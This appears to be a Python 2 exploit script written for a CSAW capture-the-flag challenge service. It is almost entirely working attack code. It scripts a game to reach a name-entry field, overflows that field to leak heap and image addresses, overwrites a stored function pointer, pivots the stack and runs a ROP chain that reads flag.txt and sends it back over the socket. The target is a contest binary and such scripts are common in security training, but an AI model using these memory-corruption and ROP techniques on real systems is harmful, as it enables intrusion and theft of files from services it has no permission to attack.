#!/usr/bin/env python
# -*- coding: utf-8 -*
# author: SAI
import os,sys,time,traceback,pdb,datetime,random
import time
from socket import *
def pass_game(sock, data, t):
    colwidth=30
    namelen = 4
    time.sleep(t)
    while 1:
        try:
            idx=data.find('====')
            if idx==-1:
                data = recvmsg(sock)
                continue
            lines=data[idx:].splitlines()
            bullet_line = lines[-4]

            bullet_colpos= bullet_line.find('*')
            print 'bullet colpos:',bullet_colpos
            if bullet_colpos>60:
                break
            if bullet_colpos<0 or  bullet_colpos>=colwidth:
                continue
            player_colpos=bullet_colpos
            if player_colpos > colwidth-namelen:
                player_colpos = colwidth-namelen
            sock.send(str(player_colpos))
            data = recvmsg(sock)
            if data.find('win')!=-1:
                print data
                return True
            elif data.find('sorry')!=-1:
                print data
                return False
        except timeout:
            break
        except:
            print traceback.format_exc()
            sys.exit(0)
    return False

def recvmsg(sock):
    data=''
    try:
        while 1:
            data+=sock.recv(0x400)
            #print len(data)
    except timeout:
        pass
    return data

def showtop1(sock):
    sock.send("2")
    return

def convert(addr):
    addr = '%08x' % addr
    return addr.decode('hex')[::-1]

def main():
    sock=socket(AF_INET,SOCK_STREAM)
    sock.settimeout(0.3)
    try:
        sock.connect(('exploitme.chal.csaw.io',9000))
        data = recvmsg(sock)
        print data
        time.sleep(0.2)
        print 'now, add 1st user, it is top1'
        if not pass_game(sock,data,0.1):
            return
        name = 'a'*0x30
        sock.send(name)
        data = recvmsg(sock)
        time.sleep(0.2)
        print 'now, add 2nd user, overwrite top1 name size'
        sock.send("1")
        data = recvmsg(sock)
        if not pass_game(sock,data,3):
            return
        name = 'b'*8+'\xff\x0f\x00\x00'
        sock.send(name)
        data = recvmsg(sock)
        print 'now, read data to get address'
        time.sleep(0.3)
        showtop1(sock)
        data = recvmsg(sock)
        if not data:
            print 'failed to read top1 name'
            return

        #print data
        startoff = data.find('a'*8)
        data = data[startoff:]
        top1gameoff=data.find('b'*8)
        if top1gameoff==-1:
            print 'failed to search addr from top1 name'
            return
        data=data[top1gameoff:]
        top1nameaddr = int(data[12:16][::-1].encode('hex'),16)
        getBA = 0x0042F875
        imgoffset = (getBA - int(data[16:20][::-1].encode('hex'),16))
        fakenameaddr = top1nameaddr&0xffffff00
        playeraddr = 0x004A4C84 - imgoffset
        exit = 0x00435730 - imgoffset
        testfunc  = 0x00432EE0 - imgoffset
        senddata = 0x00432D30 - imgoffset
        memcpy = 0x00433FC0 - imgoffset
        rop1 = 0x0043ac93 - imgoffset # or  [eax+0x00000001], edi ; ret  ;
        rop2 = 0x0043b912 - imgoffset # xchg eax, ebp ; mov eax, 0x00000001 ; mov esp, ebp ; pop ebp ; ret ;
        rop3 = rop2 + 6 # mov esp, ebp ; pop ebp ; ret  ;
        rop4 = rop3 + 2 # pop ebp ; ret  ;
        rop5 = 0x00433e99 - imgoffset # mov  [ebx], esi ; pop edi ; pop ebx ; pop esi ; pop ebp ; retn 0x0004 ;
        rop6 = rop5 + 3 # pop ebx ; pop esi ; pop ebp ; retn 0x0004 ;
        name = 'x'* top1gameoff + '\xff\xff\x00\x00' + convert(fakenameaddr) + '\xff\x0f\x00\x00' + data[12:16] + convert(rop1)
        print 'now, overwrite getBA of top1, len', len(name)
        sock.send("3")
        sock.send(name)
        data = recvmsg(sock)
        print 'now, call top1 getBA to detect stack address'
        showtop1(sock)
        data = recvmsg(sock)
        idx = data.find('\xff\xff')
        data = data[idx+1:]
        stackaddr = int(data[:4][::-1].encode('hex'),16) & 0xffffff00
        print 'stack address:', hex(stackaddr)
        payload2off= 0xa00
        payload2addr =  top1nameaddr + payload2off
        payload1 = [0, rop4, 0, rop4, rop2, rop4, stackaddr-4, memcpy, rop3, stackaddr, payload2addr, 0x100]
        name = 'x'* top1gameoff
        for i in payload1:
            name += convert(i)
        name += 'y'*(payload2off-len(name))
        payload2 = [rop6, playeraddr, 0, 0, rop5, 0, 0, 0, 0, 0, testfunc, 0, rop6,
                payload2addr+0x54, payload2addr+0x64, 0x30, senddata, 0, exit, payload2addr+0x64, 0x30]
        for i in payload2:
            name += convert(i)
        name += 'flag.txt' + '\x00'*0x100
        print 'now, overwrite getBA of top1, len', len(name)
        sock.send("3")
        sock.send(name)
        data = recvmsg(sock)
        time.sleep(0.5)
        print 'now, call top1 getBA(rop)'
        showtop1(sock)
        sock.settimeout(2)
        data = ''
        try:
            data=sock.recv(0x400)
        except:
            pass
        print data
        print 'done'
        time.sleep(1)
    except:
        print traceback.format_exc()
    finally:
        sock.shutdown(SHUT_WR)
        sock.close()
    return

if __name__=='__main__':
    main()

